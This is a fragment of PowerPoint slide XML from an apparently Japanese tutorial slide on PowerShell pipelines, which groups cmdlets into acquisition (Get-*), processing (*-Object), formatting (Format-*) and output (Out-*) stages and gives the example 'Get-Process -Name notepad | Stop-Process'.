                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>つずつ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受け渡す。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 </a:t>
            </a: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8697E891-E62D-4B6B-3FE3-2C5984887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992" y="2564904"/>
            <a:ext cx="7020780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▍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データ処理のパイプライン例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8E579A8B-41A1-D050-E458-63A09D68835A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="884285" y="3071865"/>
            <a:ext cx="2207230" cy="846694"/>
            <a:chOff x="884285" y="3071865"/>
            <a:chExt cx="2207230" cy="846694"/>
          </a:xfrm>
        </p:grpSpPr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8FC598ED-6DFB-D6F5-2781-370DFEFBB536}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="308094"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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584CFAB3-E80E-3EAB-6C80-244B61F9B007}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="330377"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="60" name="グループ化 59">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98C34487-C365-FCC0-A2A2-973048E3EBD3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="884992" y="3077193"/>
              <a:ext cx="2206523" cy="841366"/>
              <a:chOff x="884992" y="3077193"/>
              <a:chExt cx="2206523" cy="841366"/>
            </a:xfrm>
          </p:grpSpPr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85BDA6A7-A666-A1BE-FA5A-A402CDFAA788}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="884992" y="3077193"/>
                <a:ext cx="2186672" cy="3337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000" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>取得</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP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5FEA6B81-9D05-F4BB-865B-37C42CA2A8D7}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="894564" y="3410963"/>
                <a:ext cx="2196951" cy="507596"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" lIns="180000" rIns="180000" rtlCol="0" anchor="ctr">
                <a:noAutofit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP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Get-*</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="59" name="正方形/長方形 58">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80813E26-36F5-8CDD-CFCF-8CDF5B63143B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="894564" y="3078252"/>
              <a:ext cx="2177100" cy="840307"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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</p:grp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C49FFFB0-B996-2597-FF10-7841B875E4AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1883532" y="1808820"/>
            <a:ext cx="8280920" cy="40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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-Process -Name notepad | Stop-Process</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="56" name="表 55">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56B01247-2B91-A93F-BA75-D32DD1276B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131630"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="3495451" y="4076092"/>
          <a:ext cx="2459748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874">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1229874">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="371514067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r"/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-Object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3255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Where-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Tee-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14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Select-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Measure-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370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ForEach</a:t>
                      </a:r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-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Group-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056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Sort-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Compare-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033046"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="58" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57CFC245-5627-15B5-BC9A-AF08231CFD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011732"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="9336360" y="4077072"/>
          <a:ext cx="18002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2810130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Out-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14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-Host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370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GridView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056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-File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033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000" i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-String</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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44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000" i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-Null</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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097508"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="89" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BC77B01-B5EE-4B0B-096A-81C37DF32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405023"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6600056" y="4075896"/>
          <a:ext cx="18002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2810130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Format-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14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-Table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370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-List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056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-Wide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033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000" i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-Custom</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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447962"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="90" name="グループ化 89">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FC67961-D4E3-45AF-FAB8-3D524B493CC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9125275" y="3071865"/>
            <a:ext cx="2207230" cy="846694"/>
            <a:chOff x="884285" y="3071865"/>
            <a:chExt cx="2207230" cy="846694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="91" name="正方形/長方形 90">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D1216D0-B27C-9EC7-E129-3F3946073205}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="308094"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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92" name="正方形/長方形 91">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0E907F4-07E8-D8E4-8007-6A03BB2EFC06}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="330377"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="93" name="グループ化 92">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8B6C825-6081-A14E-24F0-FA7E84A25EA5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="884992" y="3077193"/>
              <a:ext cx="2206523" cy="841366"/>
              <a:chOff x="884992" y="3077193"/>
              <a:chExt cx="2206523" cy="841366"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="95" name="テキスト ボックス 94">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBA95FDE-AAD0-289C-154F-9ADB93B80E72}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="884992" y="3077193"/>
                <a:ext cx="218667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2000" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>出力</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP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6" name="テキスト ボックス 95">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03A0DA36-ACB8-F6E9-F52D-8757C11B6BDF}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="894564" y="3410963"/>
                <a:ext cx="2196951" cy="507596"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" lIns="180000" rIns="180000" rtlCol="0" anchor="ctr">
                <a:noAutofit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP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Out-*</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="94" name="正方形/長方形 93">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9FE3C75B-32D1-A200-3416-DE08DBD1A4E1}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="894564" y="3078252"/>
              <a:ext cx="2177100" cy="840307"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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</p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="97" name="グループ化 96">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B84F0C5B-8F00-654E-78C9-5D81C8CE0356}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6378279" y="3071865"/>
            <a:ext cx="2207230" cy="846694"/>
            <a:chOff x="884285" y="3071865"/>
            <a:chExt cx="2207230" cy="846694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98" name="正方形/長方形 97">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2FC54FBC-79C2-3B9A-1A85-658AD5753312}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="308094"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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99" name="正方形/長方形 98">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F273D207-833D-7425-E8CB-A96036DF84DF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="330377"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="100" name="グループ化 99">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98DBB6CD-D47C-6063-53FC-7A7547FC335F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="884992" y="3077193"/>
              <a:ext cx="2206523" cy="841366"/>
              <a:chOff x="884992" y="3077193"/>
              <a:chExt cx="2206523" cy="841366"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="102" name="テキスト ボックス 101">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0C10705-4A49-4068-1803-8417ABC67928}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="884992" y="3077193"/>
                <a:ext cx="218667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dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>見た目を調整</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="103" name="テキスト ボックス 102">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8C4E284-F5FA-3D25-B29D-A6EFC5189E8F}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="894564" y="3410963"/>
                <a:ext cx="2196951" cy="507596"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" lIns="180000" rIns="180000" rtlCol="0" anchor="ctr">
                <a:noAutofit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr lang="en-US" altLang="ja-JP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Format</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP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-*</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="101" name="正方形/長方形 100">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37D983B8-5D44-F0F4-C5E6-C5A89A0E9F54}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="894564" y="3078252"/>
              <a:ext cx="2177100" cy="840307"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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</p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="106" name="グループ化 105">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83A8835C-EEDB-01FE-315D-BDCBF5887EF7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3631282" y="3071865"/>
            <a:ext cx="2207230" cy="846694"/>
            <a:chOff x="884285" y="3071865"/>
            <a:chExt cx="2207230" cy="846694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="107" name="正方形/長方形 106">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A437713C-0825-132A-0623-701BDCCBB8E7}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="308094"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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108" name="正方形/長方形 107">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{592844E0-6DF2-10F6-E1E1-2E4796492FA5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="884285" y="3071865"/>
              <a:ext cx="2196951" cy="330377"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
  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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="109" name="グループ化 108">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB160465-9B39-A1D9-CFF2-30B7A3FDC8FD}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="884992" y="3077193"/>
              <a:ext cx="2206523" cy="841366"/>
              <a:chOff x="884992" y="3077193"/>
              <a:chExt cx="2206523" cy="841366"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="111" name="テキスト ボックス 110">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED4B9FF8-3185-9C20-A4CB-1A67D6707618}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="884992" y="3077193"/>
                <a:ext cx="218667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000" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>加工</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP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2" name="テキスト ボックス 111">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BFBA53F3-53DD-D0B8-A424-438B55285274}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="894564" y="3410963"/>
                <a:ext cx="2196951" cy="507596"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" lIns="180000" rIns="180000" rtlCol="0" anchor="ctr">
                <a:noAutofit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="ja-JP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*</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP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-Object</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
